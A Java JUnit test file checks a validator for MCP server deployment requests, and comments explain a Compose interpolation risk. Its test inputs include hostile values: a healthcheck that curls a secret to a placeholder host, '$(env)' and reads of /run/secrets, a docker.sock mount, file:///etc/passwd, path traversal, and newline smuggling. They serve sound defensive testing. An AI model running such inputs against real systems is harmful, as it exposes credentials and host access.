package io.hermes.missioncontrol.mcp;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertNull;
import static org.junit.jupiter.api.Assertions.assertThrows;

import java.util.Collections;
import java.util.List;
import java.util.function.Consumer;
import java.util.stream.IntStream;
import org.junit.jupiter.api.Test;

class McpRequestValidatorTest {

  @Test
  void validatesAndNormalizesManagedInput() {
    var value = McpRequestValidator.validate(new McpServerRequest(
        " Demo ", " description ", "MANAGED", "dh-local", "HTTP", null,
        "example/server:latest", "linux/arm64", List.of("node"), List.of("server.js"),
        null, List.of(), 1100, null, null, null,
        List.of(new ConfigValueInput("TOKEN", "value", true, false)), List.of(),
        List.of(new VolumeSpec("data", "/data")), null, List.of()));

    assertEquals("Demo", value.name());
    assertEquals("managed", value.kind());
    assertEquals("http", value.transport());
    assertEquals("/mcp", value.path());
  }

  @Test
  void rejectsUnsafeDeploymentShapes() {
    McpServerRequest bindLikeVolume = managed(List.of(new VolumeSpec("data", "/var/run/docker.sock")));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(bindLikeVolume));

    McpServerRequest newlineCommand = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of("hello\nworld"), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(newlineCommand));
  }

  @Test
  void externalAllowsHeadersButRejectsEnvironmentAndRedirectSchemes() {
    McpServerRequest withEnvironment = new McpServerRequest(
        "Remote", null, "external", null, "sse", "https://example.test/sse", null, null,
        List.of(), List.of(), null, List.of(), null, null, null, null,
        List.of(new ConfigValueInput("TOKEN", "x", true, false)), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(withEnvironment));

    McpServerRequest fileUrl = new McpServerRequest(
        "Remote", null, "external", null, "http", "file:///etc/passwd", null, null,
        List.of(), List.of(), null, List.of(), null, null, null, null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(fileUrl));
  }

  @Test
  void stdioUsesExecutableAndArgsNotManagedCommand() {
    var value = McpRequestValidator.validate(new McpServerRequest(
        "Local tool", null, "stdio", null, null, null, null, null,
        List.of(), List.of(), "npx", List.of("-y", "@example/mcp"), null, null,
        null, null, List.of(new ConfigValueInput("TOKEN", "x", true, false)),
        List.of(), List.of(), null, List.of()));
    assertEquals("stdio", value.transport());
    assertEquals("npx", value.stdioCommand());
    assertEquals(List.of("-y", "@example/mcp"), value.args());
  }

  // --- Compose interpolation ----------------------------------------------------------
  //
  // entrypoint, command and healthcheck.test are written literally into the generated
  // Compose file, and Compose interpolates ${VAR} in the values it parses — YAML single
  // quotes do not stop it. The Compose process environment holds the decrypted secrets of
  // every managed server in the stack, keyed by SHA-256(serverId, serviceKey, key), and
  // all three inputs appear in this server's own API response. So a '$' in one of these
  // fields lets a server read another server's credentials and echo them to its own log.

  @Test
  void aComposeInterpolationSequenceIsRejectedInCommandAndEntrypoint() {
    McpServerRequest inCommand = managedWith(
        List.of(), List.of("sh", "-c", "echo ${MC_MCP_00112233445566778899}"), null);
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(inCommand));

    McpServerRequest inEntrypoint = managedWith(List.of("/bin/sh", "-c", "$(env)"), List.of(), null);
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(inEntrypoint));
  }

  @Test
  void aComposeInterpolationSequenceIsRejectedInAHealthcheckTest() {
    McpServerRequest interpolated = managedWith(List.of(), List.of(),
        new HealthcheckSpec(List.of("CMD-SHELL", "curl -d \"${MC_MCP_00112233445566778899}\" x://y"),
            "5s", "3s", 3, "1s"));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(interpolated));

    McpServerRequest substitution = managedWith(List.of(), List.of(),
        new HealthcheckSpec(List.of("CMD-SHELL", "echo $(cat /run/secrets/x)"), "5s", "3s", 3, "1s"));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(substitution));
  }

  @Test
  void aComposeInterpolationSequenceIsRejectedInASupportServiceCommand() {
    // support services share the stack, and therefore the same process environment
    McpServerRequest request = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null,
        List.of(new SupportServiceRequest("db", "postgres:17", null,
            List.of(), List.of("sh", "-c", "echo ${MC_MCP_00112233445566778899}"),
            List.of(), List.of(), null)));
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(request));
  }

  @Test
  void aDollarSignIsStillAcceptedInAConfigurationValueBecauseSecretsContainThem() {
    // the guard against over-fixing: configuration values never appear literally in the
    // file, only as a ${MC_MCP_…:-} reference, so they cannot interpolate — and rejecting
    // '$' here would refuse perfectly good passwords
    var value = McpRequestValidator.validate(new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of("server.js"), null, List.of(), 1100, null, "/mcp", null,
        List.of(new ConfigValueInput("PASSWORD", "p$$w0rd${x}", true, false)), List.of(),
        List.of(), null, List.of()));

    assertEquals("p$$w0rd${x}", value.environment().getFirst().value());
  }

  @Test
  void aDollarSignInAnImageReferenceWasAlreadyRejected() {
    // regression pin: the image pattern excludes '$', '{' and '}' already
    McpServerRequest request = new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/${MC_MCP_x}", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), null, List.of());
    assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(request));
  }

  // --- volumes ------------------------------------------------------------------------
  //
  // A managed server's volumes are named volumes, never binds, and the target is the only
  // client-chosen path inside the container. Every rule below is what keeps a target from
  // landing somewhere it can reach the host.

  @Test
  void aVolumeTargetCannotEscapeItsMountPoint() {
    assertEquals("volume targets must be safe absolute container paths",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("data", "/data/../../etc")))));
    assertEquals("volume targets must be safe absolute container paths",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("data", "/data/..")))));
  }

  @Test
  void aVolumeTargetMustBeAnAbsolutePathAndNeverTheDockerSocket() {
    assertEquals("volume targets must be safe absolute container paths",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("data", "data")))));
    assertEquals("volume targets must be safe absolute container paths",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("sock", "/var/run/docker.sock")))));
    assertEquals("volume target is required",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("data", "  ")))));
  }

  @Test
  void volumeNamesAreLowercasedThenHeldToTheDockerNameGrammar() {
    var value = McpRequestValidator.validate(
        managedRequest(r -> r.volumes = List.of(new VolumeSpec("DATA", "/data"))));
    assertEquals("data", value.volumes().getFirst().name());

    assertEquals("invalid volume name: -data",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("-data", "/data")))));
    assertEquals("invalid volume name: da/ta",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("da/ta", "/data")))));
    assertEquals("volume name is too long",
        rejected(managedRequest(r -> r.volumes = List.of(new VolumeSpec("v".repeat(64), "/data")))));
  }

  @Test
  void duplicateVolumeNamesAreRejectedAfterLowercasingSoTheyCannotCollideInCompose() {
    assertEquals("duplicate volume name: data",
        rejected(managedRequest(r -> r.volumes =
            List.of(new VolumeSpec("data", "/one"), new VolumeSpec("DATA", "/two")))));
  }

  @Test
  void theVolumeListIsBoundedAndEntriesCannotBeNull() {
    List<VolumeSpec> tooMany = IntStream.rangeClosed(0, 20)
        .mapToObj(i -> new VolumeSpec("v" + i, "/d" + i)).toList();
    assertEquals("too many volumes", rejected(managedRequest(r -> r.volumes = tooMany)));
    assertEquals("volume entries cannot be null",
        rejected(managedRequest(r -> r.volumes = Collections.singletonList(null))));
  }

  // --- configuration keys and values --------------------------------------------------

  @Test
  void environmentKeysMustBeShellIdentifiers() {
    assertEquals("invalid environment key: 1TOKEN",
        rejected(managedRequest(r -> r.environment = List.of(value("1TOKEN")))));
    assertEquals("invalid environment key: MY-TOKEN",
        rejected(managedRequest(r -> r.environment = List.of(value("MY-TOKEN")))));
    assertEquals("environment key is required",
        rejected(managedRequest(r -> r.environment = List.of(value(null)))));

    var ok = McpRequestValidator.validate(managedRequest(r -> r.environment = List.of(value("_TOKEN2"))));
    assertEquals("_TOKEN2", ok.environment().getFirst().key());
  }

  @Test
  void headerKeysFollowTheHttpTokenGrammarNotTheShellOne() {
    var ok = McpRequestValidator.validate(managedRequest(r -> r.headers = List.of(value("X-Api-Key"))));
    assertEquals("X-Api-Key", ok.headers().getFirst().key());

    assertEquals("invalid header key: X Api Key",
        rejected(managedRequest(r -> r.headers = List.of(value("X Api Key")))));
    assertEquals("invalid header key: X(Api)",
        rejected(managedRequest(r -> r.headers = List.of(value("X(Api)")))));
  }

  @Test
  void duplicateConfigurationKeysAreRejectedAndHeaderNamesCompareCaseInsensitively() {
    assertEquals("duplicate configuration key: TOKEN",
        rejected(managedRequest(r -> r.environment = List.of(value("TOKEN"), value("TOKEN")))));
    // headers are case-insensitive in HTTP, environment variables are not
    assertEquals("duplicate configuration key: x-api-key",
        rejected(managedRequest(r -> r.headers = List.of(value("X-Api-Key"), value("x-api-key")))));

    var ok = McpRequestValidator.validate(
        managedRequest(r -> r.environment = List.of(value("TOKEN"), value("token"))));
    assertEquals(2, ok.environment().size());
  }

  @Test
  void theConfigurationListIsBoundedAndEntriesCannotBeNull() {
    List<ConfigValueInput> tooMany = IntStream.rangeClosed(0, 100)
        .mapToObj(i -> value("K" + i)).toList();
    assertEquals("too many configuration values",
        rejected(managedRequest(r -> r.environment = tooMany)));
    assertEquals("configuration entries cannot be null",
        rejected(managedRequest(r -> r.environment = Collections.singletonList(null))));
  }

  @Test
  void aConfigurationValueCannotSmuggleControlCharactersOrRunOverTheLengthCap() {
    assertEquals("configuration value cannot contain control characters",
        rejected(managedRequest(r -> r.environment =
            List.of(new ConfigValueInput("TOKEN", "one\nMC_MCP_x=two", true, false)))));
    assertEquals("configuration value is too long",
        rejected(managedRequest(r -> r.environment =
            List.of(new ConfigValueInput("TOKEN", "x".repeat(8_193), true, false)))));
  }

  // --- URLs ---------------------------------------------------------------------------

  @Test
  void anUrlCarryingCredentialsAFragmentOrNoHostIsRejected() {
    String expected = "url must be an HTTP(S) URL without credentials or fragment";
    assertEquals(expected, rejected(externalRequest(r -> r.url = "https://user:pass@example.test/mcp")));
    assertEquals(expected, rejected(externalRequest(r -> r.url = "https://example.test/mcp#frag")));
    assertEquals(expected, rejected(externalRequest(r -> r.url = "http:///mcp")));
    assertEquals(expected, rejected(externalRequest(r -> r.url = "ftp://example.test/mcp")));
  }

  @Test
  void anUnparseableUrlIsReportedAsInvalidRatherThanEscapingAsAUriException() {
    assertEquals("url must be a valid HTTP(S) URL",
        rejected(externalRequest(r -> r.url = "http://exa mple.test/mcp")));
  }

  @Test
  void theUrlSchemeComparisonIsCaseInsensitiveAndTheValueIsKeptVerbatim() {
    var value = McpRequestValidator.validate(externalRequest(r -> {
      r.transport = "sse";
      r.url = "HTTPS://Example.test/sse";
    }));
    assertEquals("HTTPS://Example.test/sse", value.url());
  }

  @Test
  void crossHostUrlIsHeldToTheSameRuleAsUrl() {
    assertEquals("crossHostUrl must be an HTTP(S) URL without credentials or fragment",
        rejected(managedRequest(r -> r.crossHostUrl = "https://user:pass@peer.test/mcp")));

    var value = McpRequestValidator.validate(managedRequest(r -> r.crossHostUrl = "http://peer.test:1100/mcp"));
    assertEquals("http://peer.test:1100/mcp", value.crossHostUrl());
  }

  // --- path ---------------------------------------------------------------------------

  @Test
  void aPathMustBeRelativeAndStartWithExactlyOneSlash() {
    assertEquals("/mcp", McpRequestValidator.validate(managedRequest(r -> r.path = "   ")).path());
    assertEquals("/tools/mcp", McpRequestValidator.validate(managedRequest(r -> r.path = "/tools/mcp")).path());

    // '//host' is a protocol-relative URL, not a path: it would point the gateway elsewhere
    assertEquals("path must start with one /", rejected(managedRequest(r -> r.path = "//evil.test/mcp")));
    assertEquals("path must start with one /", rejected(managedRequest(r -> r.path = "mcp")));
    // NOTE: normalizePath's own "path must be a relative HTTP path" is swallowed by the
    // catch block directly below the throw, so a fragment surfaces as the generic message.
    // Pinned as-is rather than depending on wording the code cannot currently produce.
    assertEquals("path is invalid", rejected(managedRequest(r -> r.path = "/mcp#frag")));
  }

  // --- ports --------------------------------------------------------------------------

  @Test
  void internalPortIsRequiredAndBothPortsAreBoundedToTheTcpRange() {
    assertEquals("internalPort must be between 1 and 65535",
        rejected(managedRequest(r -> r.internalPort = null)));
    assertEquals("internalPort must be between 1 and 65535",
        rejected(managedRequest(r -> r.internalPort = 0)));
    assertEquals("internalPort must be between 1 and 65535",
        rejected(managedRequest(r -> r.internalPort = 65_536)));
    assertEquals("publishedPort must be between 1 and 65535",
        rejected(managedRequest(r -> r.publishedPort = 0)));

    var value = McpRequestValidator.validate(managedRequest(r -> {
      r.internalPort = 65_535;
      r.publishedPort = 1;
    }));
    assertEquals(65_535, value.internalPort());
    assertEquals(1, value.publishedPort());
    assertNull(McpRequestValidator.validate(managedRequest(r -> { })).publishedPort());
  }

  // --- healthcheck --------------------------------------------------------------------

  @Test
  void aHealthcheckMustBeginWithCmdCmdShellOrNone() {
    assertEquals("healthcheck.test must begin with CMD, CMD-SHELL, or NONE",
        rejected(managedRequest(r -> r.healthcheck = health(List.of("sh", "-c", "true")))));
    assertEquals("healthcheck.test must begin with CMD, CMD-SHELL, or NONE",
        rejected(managedRequest(r -> r.healthcheck = health(List.of()))));

    var value = McpRequestValidator.validate(
        managedRequest(r -> r.healthcheck = health(List.of("CMD", "true"))));
    assertEquals(List.of("CMD", "true"), value.healthcheck().test());
  }

  @Test
  void aNoneHealthcheckCannotCarryArguments() {
    assertEquals("NONE healthcheck cannot have arguments",
        rejected(managedRequest(r -> r.healthcheck = health(List.of("NONE", "true")))));
    assertEquals(List.of("NONE"), McpRequestValidator
        .validate(managedRequest(r -> r.healthcheck = health(List.of("NONE")))).healthcheck().test());
  }

  @Test
  void healthcheckDurationsMustBePositiveComposeDurations() {
    assertEquals("healthcheck.interval must be a positive Compose duration such as 5s",
        rejected(managedRequest(r -> r.healthcheck =
            new HealthcheckSpec(List.of("CMD", "true"), "0s", null, null, null))));
    assertEquals("healthcheck.timeout must be a positive Compose duration such as 5s",
        rejected(managedRequest(r -> r.healthcheck =
            new HealthcheckSpec(List.of("CMD", "true"), null, "5", null, null))));
    assertEquals("healthcheck.startPeriod must be a positive Compose duration such as 5s",
        rejected(managedRequest(r -> r.healthcheck =
            new HealthcheckSpec(List.of("CMD", "true"), null, null, null, "1 s"))));

    var value = McpRequestValidator.validate(managedRequest(r -> r.healthcheck =
        new HealthcheckSpec(List.of("CMD", "true"), "1.5s", "500ms", null, "2m")));
    assertEquals("1.5s", value.healthcheck().interval());
    assertEquals("500ms", value.healthcheck().timeout());
    assertEquals("2m", value.healthcheck().startPeriod());
  }

  @Test
  void healthcheckRetriesAreBounded() {
    assertEquals("healthcheck.retries must be between 1 and 100",
        rejected(managedRequest(r -> r.healthcheck =
            new HealthcheckSpec(List.of("CMD", "true"), null, null, 0, null))));
    assertEquals("healthcheck.retries must be between 1 and 100",
        rejected(managedRequest(r -> r.healthcheck =
            new HealthcheckSpec(List.of("CMD", "true"), null, null, 101, null))));

    var value = McpRequestValidator.validate(managedRequest(r -> r.healthcheck =
        new HealthcheckSpec(List.of("CMD", "true"), null, null, 100, null)));
    assertEquals(100, value.healthcheck().retries());
  }

  // --- support services ---------------------------------------------------------------

  @Test
  void supportServiceNamesAndImagesAreValidatedLikeTheMainService() {
    assertEquals("invalid support service name: db_1",
        rejected(managedRequest(r -> r.supportServices = List.of(support("db_1", "postgres:17", null)))));
    assertEquals("duplicate support service name: db",
        rejected(managedRequest(r -> r.supportServices =
            List.of(support("db", "postgres:17", null), support("DB", "postgres:17", null)))));
    assertEquals("support service image is required",
        rejected(managedRequest(r -> r.supportServices = List.of(support("db", null, null)))));
    assertEquals("invalid support service image",
        rejected(managedRequest(r -> r.supportServices = List.of(support("db", "postgres 17", null)))));
    assertEquals("invalid support service platform",
        rejected(managedRequest(r -> r.supportServices = List.of(support("db", "postgres:17", "!bad")))));

    // a support service name is lowercased the same way, and a valid platform passes
    var value = McpRequestValidator.validate(managedRequest(r -> r.supportServices =
        List.of(support("DB", "postgres:17", "linux/arm64"))));
    assertEquals("db", value.supportServices().getFirst().name());
    assertEquals("linux/arm64", value.supportServices().getFirst().platform());
  }

  @Test
  void aSupportServiceGetsTheSameVolumeAndConfigGuardsAsTheMainService() {
    // support services render into the same stack, so a bind-like target there is exactly
    // as dangerous as one on the main service
    assertEquals("volume targets must be safe absolute container paths",
        rejected(managedRequest(r -> r.supportServices = List.of(new SupportServiceRequest(
            "db", "postgres:17", null, List.of(), List.of(), List.of(),
            List.of(new VolumeSpec("sock", "/var/run/docker.sock")), null)))));
    assertEquals("invalid environment key: 1BAD",
        rejected(managedRequest(r -> r.supportServices = List.of(new SupportServiceRequest(
            "db", "postgres:17", null, List.of(), List.of(), List.of(value("1BAD")),
            List.of(), null)))));
    assertEquals("healthcheck.test must begin with CMD, CMD-SHELL, or NONE",
        rejected(managedRequest(r -> r.supportServices = List.of(new SupportServiceRequest(
            "db", "postgres:17", null, List.of(), List.of(), List.of(), List.of(),
            health(List.of("pg_isready")))))));
  }

  @Test
  void theSupportServiceListIsBoundedAndEntriesCannotBeNull() {
    List<SupportServiceRequest> tooMany = IntStream.rangeClosed(0, 10)
        .mapToObj(i -> support("s" + i, "postgres:17", null)).toList();
    assertEquals("too many support services", rejected(managedRequest(r -> r.supportServices = tooMany)));
    assertEquals("support service entries cannot be null",
        rejected(managedRequest(r -> r.supportServices = Collections.singletonList(null))));
  }

  // --- kind invariants ----------------------------------------------------------------

  @Test
  void aMissingBodyOrUnknownKindIsRejected() {
    assertEquals("request body is required",
        assertThrows(IllegalArgumentException.class, () -> McpRequestValidator.validate(null)).getMessage());
    assertEquals("kind is required", rejected(managedRequest(r -> r.kind = null)));
    assertEquals("kind must be managed, external, or stdio",
        rejected(managedRequest(r -> r.kind = "sidecar")));
  }

  @Test
  void managedRequiresAHostAnImageAndAnHttpTransport() {
    assertEquals("hostId is required for managed servers",
        rejected(managedRequest(r -> r.hostId = null)));
    assertEquals("image is required and must be a valid image reference",
        rejected(managedRequest(r -> r.image = null)));
    assertEquals("image is required and must be a valid image reference",
        rejected(managedRequest(r -> r.image = "example/server latest")));
    assertEquals("platform is invalid", rejected(managedRequest(r -> r.platform = "!bad")));
    assertEquals("transport must be http or sse", rejected(managedRequest(r -> r.transport = null)));
    assertEquals("transport must be http or sse", rejected(managedRequest(r -> r.transport = "stdio")));
  }

  @Test
  void managedRejectsTheFieldsThatBelongToTheOtherKinds() {
    String expected = "url and stdio fields do not apply to managed servers";
    assertEquals(expected, rejected(managedRequest(r -> r.url = "https://example.test/mcp")));
    assertEquals(expected, rejected(managedRequest(r -> r.stdioCommand = "npx")));
    assertEquals(expected, rejected(managedRequest(r -> r.args = List.of("-y", "@example/mcp"))));
  }

  @Test
  void externalRejectsEveryManagedDeploymentFieldOneByOne() {
    // each of these would otherwise be stored, and later rendered into a Compose stack for
    // a server that has no stack at all
    List<Consumer<Req>> leaks = List.of(
        r -> r.hostId = "dh-local",
        r -> r.image = "example/server:latest",
        r -> r.platform = "linux/arm64",
        r -> r.entrypoint = List.of("node"),
        r -> r.command = List.of("server.js"),
        r -> r.stdioCommand = "npx",
        r -> r.args = List.of("-y"),
        r -> r.internalPort = 1100,
        r -> r.publishedPort = 1100,
        r -> r.path = "/mcp",
        r -> r.crossHostUrl = "http://peer.test/mcp",
        r -> r.volumes = List.of(new VolumeSpec("data", "/data")),
        r -> r.healthcheck = health(List.of("CMD", "true")),
        r -> r.supportServices = List.of(support("db", "postgres:17", null)));
    for (Consumer<Req> leak : leaks) {
      assertEquals("managed deployment fields only apply to managed servers", rejected(externalRequest(leak)));
    }

    assertEquals("url is required for external servers", rejected(externalRequest(r -> r.url = null)));
    // headers, unlike environment, are how an external server is authenticated
    var value = McpRequestValidator.validate(externalRequest(r -> r.headers = List.of(value("X-Api-Key"))));
    assertEquals("X-Api-Key", value.headers().getFirst().key());
  }

  @Test
  void stdioRequiresACommandAndRejectsUrlHeadersAndManagedFields() {
    assertEquals("stdioCommand is required for stdio servers",
        rejected(stdioRequest(r -> r.stdioCommand = null)));
    assertEquals("url does not apply to stdio servers",
        rejected(stdioRequest(r -> r.url = "https://example.test/mcp")));
    assertEquals("headers do not apply to stdio servers",
        rejected(stdioRequest(r -> r.headers = List.of(value("X-Api-Key")))));
    assertEquals("managed deployment fields only apply to managed servers",
        rejected(stdioRequest(r -> r.hostId = "dh-local")));
    assertEquals("managed deployment fields only apply to managed servers",
        rejected(stdioRequest(r -> r.volumes = List.of(new VolumeSpec("data", "/data")))));

    // a stdio server's own command and args must not trip that same guard
    var value = McpRequestValidator.validate(stdioRequest(r -> { }));
    assertEquals("npx", value.stdioCommand());
    assertEquals(List.of("-y", "@example/mcp"), value.args());
  }

  // --- scalar hygiene -----------------------------------------------------------------

  @Test
  void blankStringsCountAsAbsentAndOverlongOnesAreRejected() {
    assertEquals("name is required", rejected(managedRequest(r -> r.name = "   ")));
    assertEquals("name is too long", rejected(managedRequest(r -> r.name = "n".repeat(101))));
    assertNull(McpRequestValidator.validate(managedRequest(r -> r.description = "  ")).description());
  }

  @Test
  void aTabIsAllowedInAScalarButOtherControlCharactersAreNot() {
    assertEquals("one\ttwo",
        McpRequestValidator.validate(managedRequest(r -> r.description = "one\ttwo")).description());
    assertEquals("description cannot contain control characters",
        rejected(managedRequest(r -> r.description = "onetwo")));
    assertEquals("description cannot contain control characters",
        rejected(managedRequest(r -> r.description = "one\rtwo")));
  }

  // --- helpers ------------------------------------------------------------------------

  private static String rejected(McpServerRequest request) {
    return assertThrows(IllegalArgumentException.class,
        () -> McpRequestValidator.validate(request)).getMessage();
  }

  /**
   * Mutable stand-in for {@link McpServerRequest}, so each test above sets only the field it
   * is about instead of restating twenty-one constructor arguments. Defaults are a valid
   * managed server; {@link #externalRequest} and {@link #stdioRequest} rebase them.
   */
  private static final class Req {
    String name = "Demo";
    String description;
    String kind = "managed";
    String hostId = "dh-local";
    String transport = "http";
    String url;
    String image = "example/server:latest";
    String platform;
    List<String> entrypoint = List.of();
    List<String> command = List.of();
    String stdioCommand;
    List<String> args = List.of();
    Integer internalPort = 1100;
    Integer publishedPort;
    String path = "/mcp";
    String crossHostUrl;
    List<ConfigValueInput> environment = List.of();
    List<ConfigValueInput> headers = List.of();
    List<VolumeSpec> volumes = List.of();
    HealthcheckSpec healthcheck;
    List<SupportServiceRequest> supportServices = List.of();

    McpServerRequest build() {
      return new McpServerRequest(name, description, kind, hostId, transport, url, image, platform,
          entrypoint, command, stdioCommand, args, internalPort, publishedPort, path, crossHostUrl,
          environment, headers, volumes, healthcheck, supportServices);
    }
  }

  private static McpServerRequest managedRequest(Consumer<Req> tweak) {
    Req req = new Req();
    tweak.accept(req);
    return req.build();
  }

  private static McpServerRequest externalRequest(Consumer<Req> tweak) {
    Req req = new Req();
    req.kind = "external";
    req.hostId = null;
    req.image = null;
    req.internalPort = null;
    req.path = null;
    req.url = "https://example.test/mcp";
    tweak.accept(req);
    return req.build();
  }

  private static McpServerRequest stdioRequest(Consumer<Req> tweak) {
    Req req = new Req();
    req.kind = "stdio";
    req.hostId = null;
    req.image = null;
    req.internalPort = null;
    req.path = null;
    req.transport = null;
    req.stdioCommand = "npx";
    req.args = List.of("-y", "@example/mcp");
    tweak.accept(req);
    return req.build();
  }

  private static ConfigValueInput value(String key) {
    return new ConfigValueInput(key, "x", true, false);
  }

  private static HealthcheckSpec health(List<String> test) {
    return new HealthcheckSpec(test, null, null, null, null);
  }

  private static SupportServiceRequest support(String name, String image, String platform) {
    return new SupportServiceRequest(name, image, platform, List.of(), List.of(), List.of(), List.of(), null);
  }

  private static McpServerRequest managed(List<VolumeSpec> volumes) {
    return new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        List.of(), List.of(), null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), volumes, null, List.of());
  }

  private static McpServerRequest managedWith(
      List<String> entrypoint, List<String> command, HealthcheckSpec healthcheck) {
    return new McpServerRequest(
        "Demo", null, "managed", "dh-local", "http", null, "example/server:latest", null,
        entrypoint, command, null, List.of(), 1100, null, "/mcp", null,
        List.of(), List.of(), List.of(), healthcheck, List.of());
  }
}
